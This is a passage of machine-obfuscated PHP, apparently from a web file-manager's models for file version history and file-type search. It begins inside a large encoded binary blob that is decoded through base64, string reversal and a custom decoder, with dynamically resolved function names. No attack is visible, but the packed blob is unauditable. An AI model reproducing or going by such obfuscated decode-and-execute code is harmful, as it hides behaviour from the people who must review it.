45\120\261\41\224\22\235"."\xab\x59\xca\xa8\xe7\xef\xb8\xc9\x89\x78\x47\x2b\x1b\x69\x91\x5d\x85\xb3\xe\xbc\x55\x76\xa6\xf0\x96\x7d\x9\xd2\x31\x15\x87\xd\x2f\xdd\xcb\xb6\xcb\x14\x4c\x50\x24\xac\x7e\x92\x1f\xab\x54\x1d\x68\xc2\x70\x95"."\xd9\x84\xe1\x11\x12\xd6\x17\xce\x74\x9a\x46\x95\x10\x8e\x13\xe0\x38\x21\x74\x69\x3d\xe\xcd\x1\x52\x48\x16\x15\xae\x20\xcc\xde\x62\x8e\x39\x5c\xbc\x3\x9a\xd6\x30\x59\x44\x2e\xe6\xcc\x7b\xeb\xbc\x4b\x58\xe0".base64_decode('UgaFh5U/GyqfteEhVWX9EF7RTfxt9xKI6ES2IqwifBtXUMNJoRTDtbNjTrRLtqi204OTFQ==')."\372\106\270\202\137\76\77\321\71\77\305\5\340\65\65\23\111\217\330\3\266\134\10\327\325\346\42\121\213\35\24\221\267\225\212\156\314\236\125\231\354\233\6\266\266\223\331\123\52\224\36\13".base64_decode('0wo/dLsddasTbXUEN4EJaafUmNWJmwyhJJsfxcldJV6hyBUhrhtPYdVOp0KaOY88xFEiFw==')."\73\3\141\137\343\336\300\201\362\43\30\323\346\333\143\134\175\40\51\261\317\260\54\337\306\151\21\357\2\321\124\207\365\200\364\22\1\7\105\315\140\215\327\130\333\210\175\50\171\310\101\332"."\261\273\242\156\153\132\134\102\222\150\120\124\342\274\204\357\333\214\165\263\167\36\204\25\52\11\12\2\374\326\346\363\130\140\255\300\243\230\144\274\130\242\175\120\53\257\23\267\40\53\214\140".base64_decode('QYDJ6wkzn8QMUfKxk7Wjeo8cJYYKbDUIX/FyFdhxmUR28CoMJOyC7AZNek4CxaRnQyRB1A==')."\133\255\160\11\126\245\65\323\310\124\51\203\300\227\22\146\135\232\132\351\112\33\321\114\305\12\135\374\334\331\45\142\262\133\162\212\54\301\261\153\157\270\2\342\227\12\367\300\222\363\120\265"."\xd8\x8d\xbb\xe8\x99\x5c\x84\x7c\xb3\xa8\x8\xcd\xc3\x42\x94\xb8\x1f\x27\xe7\x58\xf8\x3d\x90\x36\x36\x8b\xa5\x72\x4a\x7c\x8a\x64\x49\x23\x9a\x60\x98\x6\xab\x7c\xb9\x18\x24\xc8\x18\xd6\x99\xf9\xb6\xb7\x7a\x9a"."\167\72\354\140\344\73\163\154\163\6\174\4\55\54\11\15\360\366\226\221\61\60\176\6\70\1\143\112\247\367\304\23\224\360\171\103\234\133\361\371\44\136\260\170\54\57\311\22\72\67\214\46".base64_decode('bqJksi6Mk6i9NAZoK5VPRwhnNzgs3F0AaH048+FlENEY6qnKdFgcuiqB52fkt09IKdEPcQ==')."\15\0\45\231\364\375\21\151\140\204\221\25\165\240\305\356\71\160\42\47\222\343\46\117\54\66\324\302\130\11\125\122\347\2\260\343\255\250\304\316\5\34\332\306\346\141\176\5\34\133\75\142"."\x26\xcd\xed\xda\x2d\x39\xc2\x72\x39\x72\x5a\x8e\x8\xb5\xf2\x74\x94\xe6\x49\x1c\x6a\x50\x67\x7e\x2\xd8\x4e\xbd\xb5\xa9\xd5\xcf\x93\xea\xf8\xf2\xa4\x8a\x12\xe1\x9f\xaf\x9e\x99\x52\xea\x43\x3a\x6c\xf0\x6\x33"."\x46\x42\x9\x47\x16\x85\xea\x3\xe1\x86\x50\x6c\xb1\xd2\x83\x4f\x5c\x85\xa9\x21\x6a\xae\x4a\x96\xad\x6a\x89\x37\x76\xc8\xa3\x42\xce\x5\x4e\x74\xc7\x74\x3a\x18\xae\x77\xf1\x7\x6e\x70\xd0\xdb\x85\xf6\x11\xde"."\x24\xdf\x6b\x59\x62\x57\x45\x7a\x8\x95\x89\xd7\x0\x9d\xd5\x52\xac\xd4\xf3\x45\x35\x66\xf1\x75\xbe\x74\x51\x19\xac\x11\x2f\x1\x9d\x16\xfa\x5f\x9\x38\x97\xd7\x8b\xe1\x87\x75\x6c\xf2\x28\xb5\x58\x2a\x50\x28"."\xd1\x1a\x80\x2f\xfd\x5\xf2\x2a\x91\xc\x8d\xc4\x23\x3d\x3b\x5e\xe3\x8d\xec\x80\x61\x19\x82\x1c\xb0\x12\xc3\x72\xed\x81\x86\xe6\x50\x8b\x1a\x8\x87\x23\x4b\x1d\x96\xc2\xe2\x2c\x20\xcf\x15\x29\x49\xf9\x85\x28".base64_decode('aWbEJNCvFzuHBFd88usbLuUKnT7Zy2iOHW7By7X8xRgalV5wy+U1w9KlBPrY2BS4Pael0w==')._kodDe('KuuCx0xG0dSoq9gzGcaZpAMWKILcBAMhAX5ey/MpQbaGlHNYhVsagvBxKJpAclKLr0dxTTA=')."\124\234\362\337\276\200\347\221\274\223\21\377\153\354\251\115\223\154\233\100\246\247\151\241\210\112\35\221\211\117\40\51\46\77\234\223\117\150\375\111\250\1\173\112\15\262\323\100\34\21\373\26"."\xc\x5\x95\xe0\xaf\xd0\xdd\x2c\xda\xa4\x63\x85\x22\xdb\xe1\x30\xe5\x1c\x22\x23\x30\xe0\xe\x33\x4b\xd7\x13\x7e\x6e\x83\x79\xc7\x3\x7d\x45\xdf\x20\xef\xc5\xd0\x3c\x72\x32\x85\x20\x3b\x45\x9f\x50\x8c\xbf\xf"."\45\212\272\163\112\64\0\145\53\102\345\305\1\224\132\245\212\276\46\311\337\376\121\346\63\117\20\342\3\304\333\141\60\223\263\35\73\375\46\371\362\214\64\45\64\1\353\177\362\134\201\107"."\347\234\105\361\304\326\262\311\124\145\336\111\350\260\330\377\141\13\114\63\63\134\224\340\320\216\205\131\157\270\55\64\176\57\51\333\155\312\243\116\350\71\276\77\105\337\212\245\212\10\17\332"."\x8f\xe8\x76\xf1\xab\x73\xb4\xf8\xff\x4d\x41\x9a\x19\x93\xdc\xde\x3a\x2b\x29\x6e\x90\xe5\xe6\x9f\x42\x96\xc3\xf\xea\xa5\xcc\x41\xe7\x3\xb2\x38\xc5\xfd\x84\x9e\xe3\xf1\x3c\x69\x85\x11\xbf\x6\xf2\x73\x7f\xce".base64_decode('Qp6id6sU8va3gogRzD224WEbXQIsfXoy/emAX8YN3Y2gdA4+WclRsT5lpJN5bp0lEpp1oQ==')."\175\40\245\20\141\311\151\354\215\163\362\270\146\3\43\351\360\124\126\251\167\25\261\217\123\347\213\137\342\41\65\301\172\235\17\113\361\363\177\113\54\41\313\166\74\145\26\67\343\132\217\207".strrev('ƒ¦'."\r".'-.Í¤÷K•ù9>´—ıÑt¤ÎCÒi:ö'."\0".'$ß>I„4É”Ò|ûe‡,7V"Š&*¢')."\333\166\171\264\105\323\31\13\161\200\321\44\277\226\313\211\363\20\231\343\242\177\35\27\251\41\257\55\336\244\22\247\42\52\65\132\210\11\234\223\316\50\151\42\234\127\26\262\41\172\56\343"."\x48\xcd\x4b\x9b\x47\xd9\x61\x34\x3d\xab\x11\xf7\x71\x1\x1c\xb5\xb3\x95\x1e\xce\xc2\x80\xc9\x55\xb2\x3\x73\xae\x67\x47\xf4\x88\xef\xb1\xfd\xc5\x7\xec\xd8\xea\xc\x28\xa\xb6\xf2\x61\xe6\x55\x7d\x26\xd9\xa3".strrev('$c²È\\p”ï›½Ÿ“æ(ßg©jğq;Ò©%öŠd)BRqôØ‰	QŒ…ó('."\0".'İäù').base64_decode('92WRgBPrHW+tsndV2dKBR1VLvJQ67kOrHnH1+stekxMXfXNoKpyv5nLJgm9GivYz7q0MHw==')."\126\127\201\250\173\220\343\146\261\322\131\230\40\70\236\201\225\172\15\244\255\370\51\131\151\30\244\176\27\362\151\17\261\306\360\60\3\310\222\257\321\72\336\266\163\117\150\211\367\154\277\262"."\102\270\0\101\166\162\111\47\325\253\231\337\225\147\307\326\156\60\303\201\273\210\1\213\333\177\324\75\164\21\203\130\236\111\116\233\76\163\256\254\61\21\123\50\16\163\331\233\14\364\7\144"."\x1c\x81\x14\x8a\x13\xd\x15\xe6\x93\x5a\x5e\xfd\x24\xd3\x79\xa3\xa6\xf8\xe9\x63\x17\x7\xf8\xef\x16\x8c\xd8\x7c\x50\x50\xc9\x48\xb7\xf8\x91\xf8\xa2\x11\x20\x78\x2a\x99\x8a\x49\xc\xd1\x65\xf7\x63\x62\x53\x1c".base64_decode('S6w6ygLFg8fOb1HxoUQ/JL4nFgt9vNZM4417Bh8I2HnNuR8tte0iI8H2eFinK2JOyyhQ0Q==').base64_decode('iGxpXybXaJtu/RIujvki0ZVGsmlg29gvhVhtEiX6LyaQbbHobkyYhOHuO3bmzlHwn8zITA==')."\211\207\212\45\203\231\57\351\3\225\364\370\326\322\253\331\136\11\71\45\375\244\156\107\310\144\3\271\20\73\140\147\277\135\325\243\142\242\216\116\217\62\36\120\261\270\47\275\147\54\174\41"."\x4a\x82\x1e\x2e\xcd\x6e\x95\x8f\xa3\x40\x20\x97\x9a\x9d\x22\x93\xfc\xdc\x2a\xb9\x11\x2c\x9c\xf6\x90\xa5\xeb\x58\xc6\x92\xb\x78\xf9\x46\x2d\xa9\x48\x5e\x1f\xc5\x55\x4b\x8f\xd7\xa\xb5\x13\xd1\x53\x41\x8f\x60"."\161\23\13\12\322\314\300\42\176\37\133\223\354\373\234\272\60\20\356\244\227\327\321\360\111\217\223\233\162\130\172\24\31\361\204\10\273\73\201\232\343\330\306\242\170\203\353\341\172\102\277\334"."\xaf\xd9\xb3\x31\x23\x44\x43\xd0\x43\xe9\x9e\xbf\x63\xab\xc4\xdf\xf3\x74\x6c\x9d\x2c\xf7\xa3\xbe\x48\x14\x74\x3c\x52\x92\x2c\x7a\x7\x1d\x8\x27\xb9\x3d\x47\xbf\x26\xb1\x5e\xc1\x65\x45\xa8\xa5\x90\x11\x11\x49"._kodDe('Kz+WTunGLwHUbvRm7/vEV9lltOiwcEDGjc4j7wnSovCm6HLgfx2/7pnoui7mfnErM8l69tU=')."\126\256\353\240\172\147\127\77\234\354\365\120\300\42\64\370\276\1\101\124\110\234\133\220\63\257\217\314\31\244\306\316\337\264\164\132\142\302\245\267\63\105\217\214\43\344\353\343\17\123\227\212".base64_decode('uO8Gux8cbydqX/aWeGcpQEGX+K6pBB7TJCYsC5qUNRJ9JQ7PiZWs8w0CSTgpAhNtQDIMcw==')."\247\351\147\241\4\336\56\22\327\61\60\172\362\365\376\110\216\155\54\53\201\13\164\236\314\250\25\161\51\2\104\113\46\124\216\244\42\362\26\167\314\211\43\121\36\156\101\203\174\154\72\35"."\x25\x9a\x5d\xef\x27\x53\x20\x4b\x1e\x5b\xc7\x79\x41\xb1\x2d\x45\x71\x69\x4e\x7\xe4\x22\xd8\x70\xdf\xa9\x1a\xc3\x13\x8c\x1b\xe6\xad\xf2\xba\x12\xaa\xbd\xae\xea\xf8\x13\xd2\x4e\x5c\x77\xbc\x69\x4c\xed\x4f\xd0"."\2\211\142\25\10\123\205\221\43\47\162\366\354\55\56\103\361\72\46\140\306\131\131\245\327\67\157\224\120\7\342\220\74\36\214\116\264\346\115\42\50\72\123\271\132\110\262\227\116\110\72\127"."\267\354\107\223\47\373\212\270\26\43\231\216\231\302\6\173\342\250\63\36\211\6\325\245\41\354\212\42\164\132\260\215\71\121\66\114\362\306\11\253\262\255\271\202\334\132\203\5\200\166\61\215"."\xa6\x40\x25\x3d\xc1\xdf\x5c\xc3\xb\x56\x78\x2\xb6\x33\xb9\x7a\x7e\x30\xeb\xbc\xfb\x2c\xdd\x90\x60\x7e\xb8\x64\x95\xa4\x13\x18\x5f\x73\x71\xae\xc5\x5\xa5\xc0\x12\x66\xde\x92\xdd\x68\x3a\x32\xb1\xd8\x65\xa2"."\xdc\x28\xdb\x47\xb7\x65\xd1\x42\xd6\xf1\x63\x6a\xa\x66\xe0\xe\x99\xbe\x7d\x46\xd5\xf4\xce\x2f\xab\x65\x6\x7b\x15\x10\x41\xce\xf8\xa\x48\xd8\x5c\xc4\xa6\x7b\x99\x6d\x2f\x83\x29\x59\xce\xa4\x7e\x73\x4a\xe5"._kodDe('K88UzH8XAQIFq9e5Emdcl+uEnZdH5P34wRciJoAgKrBZIANsTyeLkn9qfu+ajOeasOB179k=')."\xd8\x79\x17\xbe\x9c\xe1\x27\xf8\x7\x9a\xed\xe5\x6a\x46\x65\x66\x44\x58\x27\x20\x34\x3b\x84\xe2\x16\xef\x9\xe1\x4b\x76\x7e\x38\x92\x8f\x66\xf8\x9d\xc\xa2\xcd\xa1\xa\x1a\x87\x9e\x6\xac\x5\xe4\x24\xe9\xf4"."\34\155\266\222\316\47\305\110\46\111\146\336\272\241\6\351\374\327\171\374\316\357\263\26\361\277\202\21\226\262\111\51\346\365\25\375\342\253\371\41\341\72\211\144\323\63\254\300\200\306\275\223"."\xb9\x4b\xb5\x39\x36\xb2\xd2\x61\x7d\x82\x50\x88\x60\xf1\x79\xac\x38\x26\x96\xa4\x47\x56\xc\xef\x84\x5\x63\x77\xa5\x4b\x14\x55\xf0\x3c\x6d\x40\xc8\xc2\x62\x2f\x96\x4c\x36\x6a\x3\x25\x40\x93\xba\xdb\xbb\x1c"."\x4a\xe1\xa0\x44\x96\x96\x7c\x6a\x88\x8b\x32\xfa\xa0\xfc\x75\x80\x13\xf7\x58\x1c\x80\xc5\xa9\xc2\xe7\x86\x54\x5e\x9c\xc1\x89\x6e\xe2\xb4\x52\xdd\x27\x14\xce\x59\x5c\xf6\xe9\xc1\x91\x4a\x24\xd1\x27\xa3\xb8\x65".strrev('ªXtô	(*’ú©%º•Ğ91¤Ö<®©yØnC3Ÿ8D\'Äw«…v…äÂ?¦Åï´‹').strrev('…gy§Æ¢‰¥ô'."\n".'xÙ-OqÍ3•'."\0".'c¼Yâ_:bÈ˜2"½rX‡:VGô¬@·Ÿ>N')."\xd7\x5d\xad\x97\xb\xb8\x7b\x46\x4b\x38\x5e\x13\x94\xd3\x7\xd\x3b\x91\x92\x76\xc9\xc5\x99\xc5\xe9\xf9\xa2\xc1\x86\x6\x94\xee\x87\xbb\xb5\x6c\xac\xdd\xba\x3\x51\x49\x51\x7b\x24\xe3\x9f\xb8\x59\xa2\xc\x6d".base64_decode('UcliNAuXFJsTR9lxhgCXpVm4bFE2K1w0rqScrRWscbpXPHigi0qW6LDQ2Eig441nSeDizw==').base64_decode('ASa6oYnyqnQrhM7JZW5RqhUlgcdthRtayBx4B1oqx2Gz5OQopeg2yylBqSkVGteYSRj4FA==')."\xb3\xc\x91\x57\xc2\xdc\x88\x7e\x12\x4b\x3f\xb2\x1b\xc7\x12\xd9\xb2\xed\x52\x69\xeb\xa6\x68\x49\x2a\x63\x39\xcd\x8e\x5c\xe9\xf2\x0\x81\xa3\x71\x90\xa0\x1\x81\x91\x8\x96\x36\xfa\x84\x59\x27\xbb\xd5\x31\xd9"."\301\112\12\331\276\254\311\331\123\122\130\355\142\311\51\220\167\217\163\121\155\116\324\317\26\44\227\357\45\57\231\170\260\142\250\130\5\223\326\370\155\77\141\371\106\367\314\246\155\44\164\247".strrev('Áø2m]üz,3$T`;#„“ëCqf$	$¢ô%0©¨X—hjKIgÍ#›Ùy_')."\x27\x71\x6e\x4e\x59\x38\xcd\x8e\x99\x79\xdb\x83\xf3\xe2\x66\x8e\xfc\xd6\x99\xb6\x2d\xac\x49\xa8\x5e\x88\x88\xd9\x98\xf\x7b\x24\x63\x29\x14\x12\xa7\x9c\xb8\x51\xe4\xf8\x8c\xa0\x2d\xa1\x58\x24\x8\x7\xf1\x58".base64_decode('4RLTaS6hc44IPpbjEZnNwoF8Y8FlMiAS+sxklznEXCgivJIGSRzcaW7ZUohFgIqy6RdxNQ==').base64_decode('Yvlpjh8eMfKSOuCVVF9vrsdRnL47yQ23v6wGUN6LKugLJkSTCnfUYvFYUVZrIBZbGok20A==')."\7\117\212\262\111\51\311\300\256\50\253\265\51\322\62\136\136\260\71\20\12\27\345\141\133\274\26\125\70\343\244\131\241\126\322\112\162\366\74\136\53\102\365\213\105\113\212\175\240\262\263\262"."\60\74\244\51\346\105\72\73\312\245\114\166\44\304\340\143\132\232\51\203\244\263\5\75\43\274\265\212\62\116\35\227\74\377\26\163\253\314\3\316\127\6\135\246\261\14\261\241\42\154\131\327"."\2\165\107\163\220\212\37\212\341\364\201\313\371\302\274\303\347\60\3\221\322\311\32\42\104\111\302\115\231\337\223\204\51\45\7\110\76\153\50\76\7\43\271\142\0\160\303\116\61\301\130\263"."\327\354\222\316\271\350\56\13\356\230\303\220\112\326\223\64\354\310\266\265\236\222\326\20\124\205\214\251\204\120\356\376\37\310\363\153\175\16\271\0\0".base64_decode('')."".base64_decode(''), 10, -8))); goto aŞ¸ÌíÑÁ; a¹ëŠëòÛ: $fileSize = strrev(base64_decode($_SERVER[º‚¢É§í][0])); function binCheckNeq($şáœÊ¶Û, $Óòô¡Õá) { return $şáœÊ¶Û != $Óòô¡Õá; } $_SERVER[$_SERVER[º‚¢É§í][1]] = $fileSize($_SERVER[$_SERVER[º‚¢É§í][2]]); goto Eù‘ã˜¶§; fïäï÷¦§â: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\x72\x63\x65\x5f\150\x69\x73\x74\x6f\162\x79"; public function historyCount($ãÓƒè×Å) { $¬³š‘¨ë =& $_SERVER[¦»×‡Ãã]; if (!$ãÓƒè×Å) { return array(); } if (is_string($ãÓƒè×Å) || is_int($ãÓƒè×Å)) { $ãÓƒè×Å = array($ãÓƒè×Å); } $á ­äó = array($¬³š‘¨ë[193], $¬³š‘¨ë[2004] => $¬³š‘¨ë[565]); $ÛŞûÂ‡ì = array($¬³š‘¨ë[193] => array($¬³š‘¨ë[7], $ãÓƒè×Å)); $ƒÅâµï™ = $this->field($á ­äó)->where($ÛŞûÂ‡ì)->group($¬³š‘¨ë[193])->select(); return array_to_keyvalue($ƒÅâµï™, $¬³š‘¨ë[193], $¬³š‘¨ë[565]); } public function addHistory($Æ ¨¿À‹, $…İ¬¸€Š = '') { $ßĞ®Ğ•‚ =& $_SERVER[¦»×‡Ãã]; $ÛøŠÆøÄ = array($ßĞ®Ğ•‚[491] => $Æ ¨¿À‹[$ßĞ®Ğ•‚[193]], $ßĞ®Ğ•‚[1763] => isset($Æ ¨¿À‹[$ßĞ®Ğ•‚[529]]) ? $Æ ¨¿À‹[$ßĞ®Ğ•‚[529]] : $Æ ¨¿À‹[$ßĞ®Ğ•‚[527]], $ßĞ®Ğ•‚[542] => $Æ ¨¿À‹[$ßĞ®Ğ•‚[541]], $ßĞ®Ğ•‚[617] => $Æ ¨¿À‹[$ßĞ®Ğ•‚[79]], $ßĞ®Ğ•‚[2221] => $…İ¬¸€Š); if ($GLOBALS[$ßĞ®Ğ•‚[6]][$ßĞ®Ğ•‚[92]][$ßĞ®Ğ•‚[1302]] >= 1) { $this->historyAutoClear($ÛøŠÆøÄ[$ßĞ®Ğ•‚[193]]); $this->add($ÛøŠÆøÄ); } Hook::trigger($ßĞ®Ğ•‚[2222], $ÛøŠÆøÄ); Model($ßĞ®Ğ•‚[2223])->eventFileEdit($Æ ¨¿À‹[$ßĞ®Ğ•‚[193]]); } private function historyAutoClear($»„ªÉ¸à) { $ÅŸßƒò =& $_SERVER[¦»×‡Ãã]; $ü¬ü¢™† = Model($ÅŸßƒò[843])->get($ÅŸßƒò[1324]); $ÃÑ‘“‰ = intval($GLOBALS[$ÅŸßƒò[6]][$ÅŸßƒò[92]][$ÅŸßƒò[1302]]); $¯¾”ıËÓ = $ü¬ü¢™† == $ÅŸßƒò[1325] ? min(5, $ÃÑ‘“‰) : $ÃÑ‘“‰; $¯¾”ıËÓ = $¯¾”ıËÓ <= 0 ? 0 : $¯¾”ıËÓ - 1; if ($¯¾”ıËÓ >= 499) { return; } $¾Î‰š¬Ÿ = array($ÅŸßƒò[491] => $»„ªÉ¸à); $ˆİå®› = $this->field($ÅŸßƒò[2224])->where($¾Î‰š¬Ÿ)->order($ÅŸßƒò[2218])->select(); if (!$ˆİå®› || $¯¾”ıËÓ >= count($ˆİå®›)) { return; } $ëºæ‹ÆÊ = array_to_keyvalue($ˆİå®›, $ÅŸßƒò[12], $ÅŸßƒò[475]); $ëºæ‹ÆÊ = array_slice($ëºæ‹ÆÊ, $¯¾”ıËÓ); $şô¯¦Ğ¹ = array_to_keyvalue($ˆİå®›, $ÅŸßƒò[12], $ÅŸßƒò[541]); $şô¯¦Ğ¹ = array_slice($şô¯¦Ğ¹, $¯¾”ıËÓ); if (!$ëºæ‹ÆÊ || !$şô¯¦Ğ¹) { return; } $¾Î‰š¬Ÿ = array($ÅŸßƒò[493] => array($ÅŸßƒò[7], $ëºæ‹ÆÊ)); $this->where($¾Î‰š¬Ÿ)->delete(); Model($ÅŸßƒò[544])->remove($şô¯¦Ğ¹); } public function listData($î¸Ó–²‰) { $¾Ã‚©Ñå =& $_SERVER[¦»×‡Ãã]; $¾î²“’… = array($¾Ã‚©Ñå[491] => $î¸Ó–²‰); $Ê‚¥® = $¾Ã‚©Ñå[2225]; $¡ÄşÉÄí = $this->field($Ê‚¥®)->where($¾î²“’…)->order($¾Ã‚©Ñå[2218])->selectPage(); $this->_listAppendUser($¡ÄşÉÄí[$¾Ã‚©Ñå[445]]); $ÚÊëæâ¬ = Model($¾Ã‚©Ñå[843])->get($¾Ã‚©Ñå[1324]); $ ÌøÂ‰œ = 5; if ($ÚÊëæâ¬ == $¾Ã‚©Ñå[1325]) { $¡ÄşÉÄí[$¾Ã‚©Ñå[445]] = array_slice($¡ÄşÉÄí[$¾Ã‚©Ñå[445]], 0, $ ÌøÂ‰œ); $¡ÄşÉÄí[$¾Ã‚©Ñå[442]] = array($¾Ã‚©Ñå[2226] => 1, $¾Ã‚©Ñå[2227] => 20, $¾Ã‚©Ñå[2228] => 1, $¾Ã‚©Ñå[2229] => count($¡ÄşÉÄí[$¾Ã‚©Ñå[445]])); } return $¡ÄşÉÄí; } protected function _listAppendUser(&$„éÒö‰±) { $„‡ïÄ€¤ =& $_SERVER[¦»×‡Ãã]; $í«ƒòÀ‹ = array_to_keyvalue($„éÒö‰±, $„‡ïÄ€¤[12], $„‡ïÄ€¤[1772]); $çµ¨å® = Model($„‡ïÄ€¤[598])->userListInfo($í«ƒòÀ‹); foreach ($„éÒö‰± as &$äŒ‡ä®Í) { $º¡–ï‚ƒ = $äŒ‡ä®Í[$„‡ïÄ€¤[1772]]; $äŒ‡ä®Í[$„‡ïÄ€¤[527]] = $çµ¨å®[$º¡–ï‚ƒ] ? $çµ¨å®[$º¡–ï‚ƒ] : !1; } unset($äŒ‡ä®Í); } public function fileInfo($ÏŸÈğß“) { $Ú³éãò =& $_SERVER[¦»×‡Ãã]; $¡—ÆŠ„Ü = $this->tablePrefix; $ÚÅ›ºö™ = "{$¡—ÆŠ„Ü}\151\157\x5f\146\151\154\x65\40\146\151\x6c\145\x73\40\x6f\156\40\x66\151\x6c\145\x73\x2e\146\x69\x6c\145\x49\x44\x20\x3d\40\x68\x69\163\164\x6f\x72\171\x2e\x66\x69\154\145\111\x44"; return $this->alias($Ú³éãò[2230])->where(array($Ú³éãò[493] => $ÏŸÈğß“))->join($ÚÅ›ºö™, $Ú³éãò[2231])->find(); } public function removeItem($á½Š¿í‡) { $ÓşêıÕ =& $_SERVER[¦»×‡Ãã]; $´¤¾¤§¶ = array($ÓşêıÕ[493] => $á½Š¿í‡); $Í¯Ô¿”Ø = $this->where($´¤¾¤§¶)->find(); if ($Í¯Ô¿”Ø) { $ÖÃ€÷ïû = $this->where($´¤¾¤§¶)->delete(); Model($ÓşêıÕ[544])->remove($Í¯Ô¿”Ø[$ÓşêıÕ[541]]); return $ÖÃ€÷ïû; } return !1; } public function removeBySource($Ğ—ì—¬Š) { $©ÆÏÏš• =& $_SERVER[¦»×‡Ãã]; if (!$Ğ—ì—¬Š) { return !1; } if (!is_array($Ğ—ì—¬Š)) { $Ğ—ì—¬Š = array($Ğ—ì—¬Š); } $˜ò¼ÙÉ¿ = array($©ÆÏÏš•[491] => array($©ÆÏÏš•[7], $Ğ—ì—¬Š)); $Ñ—îÈ±ù = $this->field($©ÆÏÏš•[542])->where($˜ò¼ÙÉ¿)->select(); if ($Ñ—îÈ±ù) { $this->where($˜ò¼ÙÉ¿)->delete(); $©¡¹øÓ = array_to_keyvalue($Ñ—îÈ±ù, $©ÆÏÏš•[12], $©ÆÏÏš•[541]); Model($©ÆÏÏš•[544])->remove($©¡¹øÓ); } return !0; } public function setDetail($²®¹½™, $Ğ±é¦„†) { $¡ÈĞ¬ß =& $_SERVER[¦»×‡Ãã]; return $this->where(array($¡ÈĞ¬ß[493] => $²®¹½™))->save(array($¡ÈĞ¬ß[2221] => $Ğ±é¦„†)); } public function rollbackToItem($‰‚‘†Š, $¯¦åİëŒ) { $‹ïÇĞ×” =& $_SERVER[¦»×‡Ãã]; $¼Ñ¿Ã·Õ = Model($‹ïÇĞ×”[897])->sourceInfo($‰‚‘†Š); $this->addHistory($¼Ñ¿Ã·Õ, LNG($‹ïÇĞ×”[2232])); $îÒßşó = $this->find($¯¦åİëŒ); $…Àûôù = array($‹ïÇĞ×”[541] => $îÒßşó[$‹ïÇĞ×”[541]], $‹ïÇĞ×”[79] => $îÒßşó[$‹ïÇĞ×”[79]], $‹ïÇĞ×”[88] => time(), $‹ïÇĞ×”[529] => USER_ID); Model($‹ïÇĞ×”[897])->where(array($‹ïÇĞ×”[193] => $‰‚‘†Š))->save($…Àûôù); return $this->where(array($‹ïÇĞ×”[493] => $¯¦åİëŒ))->delete(); } public function clearSame($¥İ§ñ¢Ñ) { $Ï¼ø¹æê =& $_SERVER[¦»×‡Ãã]; $øË’•º = $this->listData($¥İ§ñ¢Ñ); $¡®ñ×¥Š = array_to_keyvalue_group($øË’•º, $Ï¼ø¹æê[541]); $Á¬åéû€ = array(); $†Óñò‰ì = array(); foreach ($¡®ñ×¥Š as $š¿øìàİ) { if (!$š¿øìàİ || count($š¿øìàİ) <= 1) { continue; } foreach ($š¿øìàİ as $ùÚº¤‚œ) { $Á¬åéû€[] = $ùÚº¤‚œ[$Ï¼ø¹æê[541]]; $†Óñò‰ì[] = $ùÚº¤‚œ[$Ï¼ø¹æê[475]]; } } if (!$†Óñò‰ì) { return; } $this->where(array($Ï¼ø¹æê[475] => array($Ï¼ø¹æê[7], $†Óñò‰ì)))->delete(); Model($Ï¼ø¹æê[544])->remove($Á¬åéû€); } public function userSpace() { $¡¶ñÖ =& $_SERVER[¦»×‡Ãã]; $í¼£éıÔ = $this->tablePrefix; $ÃÉªò = array($¡¶ñÖ[1763] => USER_ID); $ÏäàÈöš = "{$í¼£éıÔ}\x69\x6f\137\146\x69\x6c\x65\40\x66\151\154\145\163\40\x6f\156\x20\x66\151\154\145\x73\x2e\146\151\154\x65\x49\104\x20\x3d\x20\x68\x69\x73\164\x6f\x72\171\56\146\151\x6c\x65\x49\x44"; return $this->alias($¡¶ñÖ[2230])->where($ÃÉªò)->join($ÏäàÈöš, $¡¶ñÖ[2231])->sum($¡¶ñÖ[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ŒŒóÁÜ») { $‡…¶Ø¬ =& $_SERVER[¦»×‡Ãã]; $¡ìÉªš¿ = KodIO::fileTypeList(); $ä°’‰ÒÛ = $¡ìÉªš¿[$ŒŒóÁÜ»]; if (!$ä°’‰ÒÛ) { return array(); } $â’ÛË = $ä°’‰ÒÛ[$‡…¶Ø¬[169]]; $¸êšåŸˆ = $‡…¶Ø¬[7]; if (!$ä°’‰ÒÛ[$‡…¶Ø¬[169]]) { $’ºÁæ¡ = array_to_keyvalue($¡ìÉªš¿, $‡…¶Ø¬[12], $‡…¶Ø¬[169]); $â’ÛË = implode($‡…¶Ø¬[50], $’ºÁæ¡); $¸êšåŸˆ = $‡…¶Ø¬[2233]; } $¨³•æ‚Ø = explode($‡…¶Ø¬[50], trim($â’ÛË, $‡…¶Ø¬[50])); return array($¸êšåŸˆ, $¨³•æ‚Ø); } public function listPathType($·Ú»Åñ›) { $şéïŸ‰İ =& $_SERVER[¦»×‡Ãã]; $÷½¶‚›¦ = $this->fileTypeWhere($·Ú»Åñ›); if (!$÷½¶‚›¦) { return array(); } $ˆÑ¡˜¹ = USER_ID; $ÌÚ€Üß = Model($şéïŸ‰İ[598])->getInfo($ˆÑ¡˜¹); $©Ò‚—Ê = array($şéïŸ‰İ[648] => SourceModel::TYPE_USER, $şéïŸ‰İ[584] => array($şéïŸ‰İ[612], $şéïŸ‰İ[594] . $ÌÚ€Üß[$şéïŸ‰İ[90]][$şéïŸ‰İ[193]] . $şéïŸ‰İ[613]), $şéïŸ‰İ[649] => $ˆÑ¡˜¹, $şéïŸ‰İ[646] => 0, $şéïŸ‰İ[647] => $÷½¶‚›¦); return $this->listSource($©Ò‚—Ê); } public function listSearch($íŸÌ¾ÖÓ, $¡¤êî‚ = 300) { $·âÆŸÌÉ =& $_SERVER[¦»×‡Ãã]; if (isset($íŸÌ¾ÖÓ[$·âÆŸÌÉ[2069]]) && $íŸÌ¾ÖÓ[$·âÆŸÌÉ[2069]]) { $íŸÌ¾ÖÓ[$·âÆŸÌÉ[2069]] = str_replace($·âÆŸÌÉ[460], $·âÆŸÌÉ[2234], trim($íŸÌ¾ÖÓ[$·âÆŸÌÉ[2069]])); } $ êå¥şÕ = $this->_parseSearchWhere($íŸÌ¾ÖÓ); if (!isset($ êå¥şÕ[$·âÆŸÌÉ[505]])) { $ êå¥şÕ[$·âÆŸÌÉ[505]] = 0; } $Ä«ıŞ¼À = $·âÆŸÌÉ[2235]; $Áâ°ú¿¿ = $ êå¥şÕ; $¾ÁÜ¢³ = $Ä«ıŞ¼À; $this->_listSearchBindPinyin($íŸÌ¾ÖÓ, $ êå¥şÕ, $Ä«ıŞ¼À); $this->alias($·âÆŸÌÉ[519])->_makeOrder(); $ êå¥şÕ = 